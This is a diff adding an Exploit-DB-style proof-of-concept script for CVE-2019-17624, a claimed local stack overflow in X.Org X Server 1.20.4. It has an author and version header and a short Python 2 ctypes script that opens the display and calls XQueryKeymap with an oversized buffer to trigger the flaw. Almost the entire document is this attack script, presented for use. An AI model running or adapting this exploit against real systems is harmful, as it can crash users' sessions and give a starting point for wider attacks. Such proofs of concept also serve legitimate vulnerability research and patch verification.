@@ -1,0 +1,43 @@
+# Exploit Title: X.Org X Server 1.20.4 - Local Stack Overflow
+# Date: 2019-10-16
+# Exploit Author: Marcelo Vázquez (aka s4vitar)
+# Vendor Homepage: https://www.x.org/
+# Version: <= 1.20.4
+# Tested on: Linux
+# CVE: CVE-2019-17624
+
+#!/usr/bin/python
+#coding: utf-8
+
+# ************************************************************************
+# *                Author: Marcelo Vázquez (aka s4vitar)                 *
+# *      X.Org X Server 1.20.4 / X Protocol Version 11 (Stack Overflow)  *
+# ************************************************************************
+
+import sys, time
+import ctypes as ct
+
+from ctypes import cast
+from ctypes.util import find_library
+
+def access_violation(x11, current_display):
+	keyboard = (ct.c_char * 1000)()
+	x11.XQueryKeymap(current_display, keyboard)
+
+if __name__ == '__main__':
+
+	print "\n[*] Loading x11...\n"
+	time.sleep(2)
+
+	x11 = ct.cdll.LoadLibrary(find_library("X11"))
+	current_display = x11.XOpenDisplay(None)
+
+	print "[*] Exploiting...\n"
+	time.sleep(1)
+
+	try:
+		access_violation(x11, current_display)
+
+	except:
+		print "\nError...\n"
+		sys.exit(1)
